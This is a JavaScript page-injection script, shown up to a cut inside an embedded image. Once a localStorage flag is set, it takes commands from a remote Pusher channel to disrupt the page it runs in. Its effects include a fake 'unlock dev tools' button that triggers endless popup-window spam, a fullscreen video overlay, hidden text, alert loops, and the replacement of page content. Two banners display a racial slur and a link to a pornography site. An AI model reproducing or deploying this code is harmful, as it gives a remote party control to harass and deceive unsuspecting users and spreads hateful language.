if (!window.__chaosInjected && localStorage.getItem('chaos-listener-active') === 'true') {
  window.__chaosInjected = true;

  (function () {
    
    const script = document.createElement('script');
    script.src = 'https://js.pusher.com/7.2/pusher.min.js';
    script.onload = () => {
      const pusher = new Pusher('f02c3722bd883d397025', { cluster: 'eu' });
      const channel = pusher.subscribe('chaos-channel');

      const activeEffects = new Set();

      const activate = {
        videoBomb: () => {
          if (document.getElementById('__chaos_video')) return;
          const vid = document.createElement('video');
          vid.id = '__chaos_video';
          vid.src = 'https://www.w3schools.com/html/mov_bbb.mp4';
          vid.autoplay = true;
          vid.loop = true;
          vid.muted = true;
          Object.assign(vid.style, {
            position: 'fixed', top: 0, left: 0,
            width: '100vw', height: '100vh',
            zIndex: 2147483646
          });
          document.body.appendChild(vid);
        },
PHSpam: () => {
  // Create fullscreen black button
  const btn = document.createElement('button');
  btn.textContent = 'unlock dev tools';
  btn.style.position = 'fixed';
  btn.style.top = '0';
  btn.style.left = '0';
  btn.style.width = '100vw';
  btn.style.height = '100vh';
  btn.style.background = 'black';
  btn.style.color = 'white';
  btn.style.fontSize = '3em';
  btn.style.border = 'none';
  btn.style.cursor = 'pointer';
  document.body.appendChild(btn);

  // Spam logic
  const spamWindows = () => {
    setInterval(() => {
      for (let i = 0; i < 5; i++) {
        const width = 300;
        const height = 200;
        const left = Math.floor(Math.random() * (screen.availWidth - width));
        const top = Math.floor(Math.random() * (screen.availHeight - height));

        const win = window.open('', '', `width=${width},height=${height},top=${top},left=${left}`);
        if (!win) continue;

        win.document.body.style.margin = '0';
        win.document.body.style.background = 'black';
        win.document.body.style.overflow = 'hidden';

        const style = win.document.createElement('style');
        style.textContent = `
          .dot {
            position: absolute;
            width: 10px;
            height: 10px;
            background: hsl(${Math.random() * 360}, 100%, 50%);
            border-radius: 50%;
            animation: move 0.5s linear infinite;
          }
          @keyframes move {
            0% { transform: translate(0, 0); }
            100% { transform: translate(${Math.random() * 200 - 100}px, ${Math.random() * 200 - 100}px); }
          }
        `;
        win.document.head.appendChild(style);

        for (let j = 0; j < 100; j++) {
          const dot = win.document.createElement('div');
          dot.className = 'dot';
          dot.style.top = `${Math.random() * height}px`;
          dot.style.left = `${Math.random() * width}px`;
          win.document.body.appendChild(dot);
        }
      }
    }, 500);
  };

  // Activate on button click
  btn.onclick = () => {
    btn.remove();
    spamWindows();
  };
},
        changeBG: () => document.body.style.background = `hsl(${Math.floor(Math.random()*360)} 60% 80%)`,
        shake: () => {
          if (document.getElementById('__chaos_shake')) return;
          const s = document.createElement('style');
          s.id = '__chaos_shake';
          s.textContent = `@keyframes shake { 0%{transform:translate(0,0);}50%{transform:translate(2px,-2px);}100%{transform:translate(-2px,2px);} }
          * { animation: shake 0.1s infinite; }`;
          document.head.appendChild(s);
        },
        invertColors: () => document.body.style.filter = 'invert(1)',
        blurScreen: () => document.body.style.filter = 'blur(5px)',
        zoomIn: () => document.body.style.transform = 'scale(1.2)',
        zoomOut: () => document.body.style.transform = 'scale(0.8)',
        flipScreen: () => document.body.style.transform = 'rotate(180deg)',
        hideText: () => document.querySelectorAll('*').forEach(e => e.style.color = 'transparent'),
        rainbowText: () => {
          if (document.getElementById('__chaos_rainbow')) return;
          const s = document.createElement('style');
          s.id = '__chaos_rainbow';
          s.textContent = `@keyframes rainbow { 0%{color:red;}25%{color:orange;}50%{color:green;}75%{color:blue;}100%{color:violet;} }
          * { animation: rainbow 2s infinite; }`;
          document.head.appendChild(s);
        },
        cursorTrail: () => {
          document.addEventListener('mousemove', e => {
            const dot = document.createElement('div');
            dot.style = `position:fixed;left:${e.pageX}px;top:${e.pageY}px;width:5px;height:5px;background:#0ff;border-radius:50%;z-index:999999;pointer-events:none`;
            document.body.appendChild(dot);
            setTimeout(() => dot.remove(), 500);
          });
        },
        popupSpam: () => {
          for (let i = 0; i < 3; i++) alert('💥 Chaos!');
        },
        fakeError: () => {
          if (document.getElementById('__chaos_error')) return;
          const err = document.createElement('div');
          err.id = '__chaos_error';
          err.textContent = '⚠️ System Error: Fuck Niggers https://pornhub.com';
          Object.assign(err.style, {
            position: 'fixed', bottom: '10px', right: '10px',
            background: 'red', color: 'white', padding: '10px',
            fontSize: '16px', zIndex: 999999
          });
          document.body.appendChild(err);
        },
        typewriter: () => {
          if (document.getElementById('__chaos_typewriter')) return;
          const t = document.createElement('div');
          t.id = '__chaos_typewriter';
          t.style = 'position:fixed;bottom:20px;left:20px;color:#0ff;font-family:monospace;font-size:20px;z-index:999999';
          document.body.appendChild(t);
          let i = 0;
          const text = 'CHAOS MODE ENGAGED';
          const interval = setInterval(() => {
            if (i < text.length) t.textContent += text[i++];
            else clearInterval(interval);
          }, 100);
        },
        confetti: () => {
          const s = document.createElement('script');
          s.src = 'https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js';
          s.onload = () => confetti({ particleCount: 100, spread: 70 });
          document.body.appendChild(s);
        },
        snowfall: () => {
          const s = document.createElement('script');
          s.src = 'https://cdn.jsdelivr.net/npm/snowfall-js@1.0.0/snowfall.min.js';
          document.body.appendChild(s);
        },
        darkMode: () => document.body.style.background = '#000',
        lightMode: () => document.body.style.background = '#fff',
        broadcast: () => {
          if (document.getElementById('__chaos_broadcast')) return;
          const banner = document.createElement('div');
          banner.id = '__chaos_broadcast';
          banner.textContent = '🚨 Fuck Niggers 🚨';
          Object.assign(banner.style, {
            position: 'fixed', top: 0, left: 0, width: '100%',
            background: 'red', color: 'white', padding: '10px',
            fontSize: '20px', textAlign: 'center', zIndex: 999999
          });
          document.body.appendChild(banner);
        },
        glitch: () => {
          if (document.getElementById('__chaos_glitch')) return;
          const s = document.createElement('style');
          s.id = '__chaos_glitch';
          s.textContent = `* { animation: glitch 0.2s infinite; }
          @keyframes glitch { 0%{transform:skew(0deg);}50%{transform:skew(5deg);}100%{transform:skew(-5deg);} }`;
          document.head.appendChild(s);
        },
jobify: () => {
  if (document.getElementById('__chaos_jobify')) return;
  const s = document.createElement('style');
  s.id = '__chaos_jobify';
  s.textContent = `
    .__jobified {
      background-color: #ffe0e0 !important;
      color: #900 !important;
      font-family: Arial, sans-serif !important;
      text-align: center !important;
      padding: 20px !important;
      border: 2px dashed #900 !important;
      margin: 10px !important;
    }
    img.__jobified {
      content: url('data:image/jpeg;base64,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');
      border: 3px solid red !important;
      box-shadow: 0 0 10px black !important;
    }
  `;
  document.head.appendChild(s);

  document.querySelectorAll('img').forEach(img => {
    img.classList.add('__jobified');
    img.alt = 'Job Application Image';
  });

  document.querySelectorAll('div').forEach(div => {
    div.classList.add('__jobified');
    div.innerHTML = "<h2>🔥 Job Application 🔥</h2><p>Submit your resume now!</p>";
  });

  console.log("MOHAHAHAHHAHAHA — All images and divs are now job applications!");
},
        astolfoJumpscare: () => {
  const img = document.createElement('img');
  img.src = 'data:image/jpeg;base64,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